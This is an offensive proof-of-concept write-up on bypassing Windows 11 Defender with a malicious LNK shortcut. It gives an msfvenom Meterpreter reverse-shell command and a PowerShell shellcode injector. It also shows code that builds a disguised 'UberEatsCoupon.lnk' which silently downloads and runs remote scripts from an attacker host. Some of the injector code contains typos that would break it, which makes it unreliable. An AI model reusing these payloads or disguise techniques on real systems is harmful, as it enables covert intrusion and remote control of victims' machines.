## Table of Contents

- [**Outline**](#section-0)
- [**Windows Defender  Explanation**](#section-1)
- [**LNK**](#section-2)
- [ **Proof of Concept - Bypassing 2023 Windows Defender 11**](#section-3)




## Outline  {#section-0}

The objective of this document is to demonstrate the utilization of a malicious LNK file to initiate a multi-stage attack, including downloading and executing obfuscated AMSI bypass script, a shell code injector to bypass the most up-to-date Windows 11 Defender. 

![](/assets/AV/LNKSummary.png)  

# Windows Defender   {#section-1}
Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.

# LNK Exploitation {#section-2}

An LNK file, short for Shell Link Binary File, is a file type associated with Windows shortcuts. LNK files typically serve as pointers to executable files or applications, allowing users to quickly access programs or documents. However, in a malicious context, an LNK file can be crafted to download and execute a Defender bypass script along with a shell code injector. This technique is employed in cyberattacks to evade detection by security tools and gain unauthorized access or control over a target system. Similar to Word document macros, the malicious LNK file exploits the execution capabilities of its associated application to carry out unauthorized actions on the compromised system.

# LNK Exploitation Proof of Concept {#section-3}
<img src="/assets/AV/LNK.gif" width="1500" height="2500"/>

Below are the steps:
Generate a meterpreter shell code using the below command
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.20.131 LPORT=443 EXITFUNC=process -f ps1
```
Generate a powershell shell code process injector 

```bash

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernl32")]
    public static extern IntPtr VirtulAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SeLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <Shell Code>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

```
Conduct obfuscation on both AMSI SCript and and Shell Code Injector. This process has been neglected for possible abuse cases.

Now we continue to craft our LNK file

```bash
$doordash = 'iex (iwr -UseBasicParsing http://192.168.20.131:8888/google.txt);(iwr -usebasicparsing http://192.168.20.131:8888/facebookTest.ps1)|IEX'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($doordash)
$encodedCommand = [Convert]::ToBase64String($bytes)
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("D:\Users\kkyun\Desktop\UberEatsCoupon.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\windows\system32\cmd.exe"
$link.iconlocation = "C:\windows\system32\notepad.exe"
$link.arguments = "/c powershell -Nop -ep bypass -w hidden -EncodedCommand  $($encodedCommand)"
$link.save()
```



